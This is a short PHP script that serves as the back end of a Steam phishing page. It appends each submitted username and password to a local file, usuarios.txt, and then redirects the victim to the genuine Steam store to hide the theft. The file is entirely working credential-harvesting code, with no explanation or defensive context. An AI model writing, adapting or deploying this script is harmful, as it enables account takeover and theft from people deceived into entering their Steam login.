<?php

file_put_contents("usuarios.txt", "Steam User: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: https://store.steampowered.com/");
exit();
?>